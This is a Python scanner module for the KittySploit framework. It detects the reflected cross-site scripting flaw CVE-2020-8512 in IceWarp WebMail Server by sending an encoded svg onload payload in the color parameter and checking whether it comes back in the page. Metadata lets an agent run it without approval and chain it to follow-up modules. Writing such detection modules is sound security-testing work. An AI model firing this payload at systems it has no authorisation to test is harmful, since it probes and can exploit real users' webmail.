#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""IceWarp Webmail Server through 11."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'IceWarp WebMail Server <=11.4.4.1 - Cross-Site Scripting Detection',
        'description': 'IceWarp Webmail Server through 11.4.4.1 contains a cross-site scripting vulnerability in the /webmail/ color parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'edb', 'packetstorm', 'xss', 'icewarp', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/47988',
            'https://twitter.com/sagaryadav8742/status/1275170967527006208',
            'https://cxsecurity.com/issue/WLB-2020010205',
            'https://packetstormsecurity.com/files/156103/IceWarp-WebMail-11.4.4.1-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-8512',
        ],
        'cve': 'CVE-2020-8512',
    }

    def run(self):
        r = self.http_request(method="GET", path='/webmail/?color=%22%3E%3Csvg/onload=alert(document.domain)%3E%22', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<svg/onload=alert(document.domain)>', '<strong>IceWarp',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="IceWarp WebMail Server <=11.4.4.1 - Cross-Site Scripting detected",
                path='/webmail/?color=%22%3E%3Csvg/onload=alert(document.domain)%3E%22',
            )
            return True
        return False

